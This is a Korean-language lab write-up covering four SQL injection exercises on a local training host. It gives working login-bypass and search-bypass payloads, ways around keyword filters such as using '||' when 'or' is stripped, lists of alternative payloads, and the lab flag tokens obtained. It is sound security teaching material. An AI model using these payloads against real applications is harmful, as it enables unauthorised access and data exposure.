## 문제

대상: `http://192.168.0.21:8080/vuln/sqli/`

범위: `LAB1 ~ LAB4`

## 개요

가장 기본적인 SQL Injection 흐름 확인용 랩
로그인 폼, 검색 폼처럼 흔한 입력 지점에서 입력값이 문자열로 직접 이어 붙여질 때 조건을 참으로 만들 수 있는 구조

이 단계에서는 아직 데이터베이스 이름이나 테이블 구조를 본격적으로 덤프하기보다, 먼저 “입력값이 정말 SQL 문맥에 들어가고 있는가”를 판단하는 과정이 핵심임

## 먼저 알아두면 좋은 SQL 문법

- `WHERE`: 어떤 행을 가져올지 조건을 거는 구문
- `OR`: 앞 조건 또는 뒤 조건 중 하나라도 참이면 참
- `AND`: 앞뒤 조건이 모두 참이어야 참
- `LIMIT 1`: 결과가 여러 개여도 첫 번째 행 1개만 사용
- `#`, `-- `: 뒤쪽 쿼리를 주석 처리할 때 자주 쓰는 형태
- `'`: 문자열 시작/종료에 쓰이는 따옴표

예를 들어 아래 쿼리에서

```sql
WHERE username = 'admin' AND password = '1234'
```

아이디 입력값에 `' OR 1=1#`가 들어가면, 문자열이 중간에서 닫히고 뒤쪽 조건이 주석 처리되면서 원래 의도와 다른 SQL이 만들어질 수 있음

## 먼저 확인할 공통 포인트

초기 로그인형 SQLi에서는 아래 순서로 보는 편이 자연스러웠음

1. `'` 하나만 넣었을 때 에러 또는 비정상 응답이 나는지 확인
2. 참 조건과 거짓 조건을 번갈아 넣어 응답 차이가 생기는지 확인
3. 주석 문자(`#`, `-- `)가 필요한지 확인
4. 특정 키워드가 제거되거나 필터링되는지 확인

즉 처음부터 정답 페이로드를 넣는 것이 아니라, 문자열 탈출 가능 여부와 논리 조건 제어 가능 여부를 먼저 보는 흐름이었음

## LAB1. 로그인 우회 - 필터 없음

### 개요

아이디와 비밀번호가 그대로 쿼리에 이어 붙고, 별도 필터가 없는 구조. 서버는 조건에 맞는 첫 번째 행 한 건만 사용

### 문제 코드

```html
<ul>
    <li>아이디와 비밀번호가 문자열로 직접 이어 붙여 쿼리를 만듭니다. 별도 필터는 없습니다.</li>
    <li>서버는 조건에 맞는 <strong>첫 번째 행</strong> 한 건만 사용합니다(<code>LIMIT 1</code>).</li>
</ul>
```

```html
<form class="login-stack" method="post" action="">
    <input type="hidden" name="login_submit" value="1">
    <input type="text" name="username" id="username" value="admin">
    <input type="text" name="password" id="password" value="">
</form>
```

### 추정한 쿼리 구조

보통 이런 랩은 아래와 비슷한 형태로 동작함

```sql
SELECT id, username
FROM users
WHERE username = '$username'
  AND password = '$password'
LIMIT 1
```

### 초기 확인

먼저 아래처럼 작은 입력으로 문법 제어 여부 확인

```text
admin'
```

문법이 깨지거나 응답이 달라지면 문자열 문맥에 직접 삽입되고 있다고 볼 수 있음

그다음 참/거짓 비교로 제어 가능 여부를 봄

참 조건:

```text
admin' OR '1'='1
```

거짓 조건:

```text
admin' OR '1'='2
```

### 사용한 페이로드

```text
ID: admin' or 1=1#
PW:
```

### 확인한 출력

```text
로그인 성공: admin (id=1)
내부 토큰: SEC-SQLI-LAB1-7f3a9c2e
```

### 분석

- `admin'`으로 문자열 종료
- `or 1=1`로 조건 전체를 참으로 만듦
- `#`로 뒤쪽 비밀번호 조건을 주석 처리
- `LIMIT 1` 때문에 첫 번째 사용자 행으로 로그인 성공

### 대표 대체 페이로드

```text
admin' OR 1=1#
admin' OR '1'='1'#
admin' OR 'a'='a'#
admin' OR 1=1-- 
```

### 결과

```text
SEC-SQLI-LAB1-7f3a9c2e
```

## LAB2. 로그인 우회 - 키워드 필터

### 개요

이번에는 `or`, `and`, `--`, `#`가 제거되는 구조. 따라서 Lab 1에서 쓰던 가장 단순한 페이로드는 그대로는 통하지 않는다

### 문제 코드

```html
<div class="filter-note">
    적용 규칙(대소문자 구분 없음): 단어 경계에 있는 영단어 or·and는 제거됩니다.
    이중 하이픈과 샵 문자도 제거됩니다.
</div>
```

### 초기 확인

Lab 1과 같은 입력으로 필터 존재 여부 추정 가능

```text
' OR 1=1#
```

의도대로 동작하지 않으면, 입력 차단보다 특정 키워드 치환 가능성을 먼저 의심 가능

### 사용한 페이로드

```text
id: admin
pw: ' || 'a'='a
```

### 확인한 출력

```text
적용 규칙(대소문자 구분 없음): 단어 경계의 or·and 제거, --·# 제거
로그인 성공: admin (id=1)
내부 API 토큰: SEC-SQLI-LAB2-FILTER-TOKEN
```

### 분석

- `or`가 제거되므로 그대로는 실패
- `||`는 문맥에 따라 OR처럼 동작할 수 있음
- 비밀번호 비교 구문을 항상 참으로 바꿔 로그인 우회
- 핵심: `OR` 차단만으로 논리 연산 전체 차단 불가

### 대표 대체 페이로드

```text
' || '1'='1
' || 'a'='a
'||'x'='x
```

### 결과

```text
SEC-SQLI-LAB2-FILTER-TOKEN
```

## LAB3. 아이디 정제 + 비밀번호 필터

### 개요

아이디: 영문/숫자 외 문자 제거
비밀번호: Lab 2와 비슷한 필터 적용
즉 공격 가능 지점이 하나로 줄어든 구조

### 접근 방식

이 경우에는 양쪽 필드를 동시에 보지 않고, 어떤 필드가 여전히 문자열 문맥을 유지하는지부터 확인하는 흐름이 필요했음

아이디 필드:

```text
admin'
```

비밀번호 필드:

```text
' || 'a'='a
```

아이디는 정제로 실패하고, 비밀번호에는 필터를 우회한 논리식이 남으므로 실제 공격 지점은 비밀번호 필드로 판단 가능

### 사용한 페이로드

```text
' || 'a'='a
```

### 확인한 출력

```text
아이디: 영문·숫자 이외 제거
비밀번호: 단어 경계의 or·and 제거, --·# 제거
로그인 성공: admin (id=1)
내부 API 토큰: SEC-SQLI-LAB3-4b5c6d7e
```

### 대표 대체 페이로드

```text
' || '1'='1
' || 'b'='b
```

### 결과

```text
SEC-SQLI-LAB3-4b5c6d7e
```

## LAB4. 검색 조건 우회

### 개요

이번에는 로그인 폼이 아니라 검색 필드에서 Injection이 발생함. `LIKE '%입력값%'` 같은 구조를 먼저 가정하고 페이로드를 맞춰야 했음

### 풀이 방향

검색형 SQLi는 보통 아래처럼 추정함

```sql
SELECT title, content
FROM notices
WHERE title LIKE '%$q%'
```

이런 경우에는 앞뒤 `%`와 따옴표를 같이 고려해야 함

### 사용한 페이로드

```text
%' OR 1=1 OR '%'='
```

### 확인한 출력

```text
전 직원 대상 보안 점검 일정입니다.
내부 식별 토큰: SEC-SQLI-LAB4-1a2b3c4d
외부 유출 금지.
```

### 분석

- 앞쪽 `%` 문자열을 닫음
- `OR 1=1`로 전체 조건을 참으로 만듦
- 뒤쪽은 `OR '%'='` 형태로 문법 균형을 맞춤
- 그 결과 전체 공지가 조회되면서 내부 토큰도 함께 노출됨

### 대표 대체 페이로드

```text
%' OR '1'='1
%' OR 1=1#
%' OR 'a'='a
```

### 결과

```text
SEC-SQLI-LAB4-1a2b3c4d
```

## 정리

핵심: 처음부터 정답 페이로드를 맞히는 것보다 아래 순서대로 확인

1. 문자열 탈출 가능 여부 확인
2. 참/거짓 조건으로 응답 차이 확인
3. 주석 문자 필요 여부 확인
4. 필터가 있으면 어떤 문자/키워드가 제거되는지 확인
5. 필터를 우회할 수 있는 같은 의미의 연산자를 탐색

즉 Boolean-Based SQLi의 시작은 항상 응답 차이를 만드는 작은 입력부터 시작하는 것이 자연스러웠음
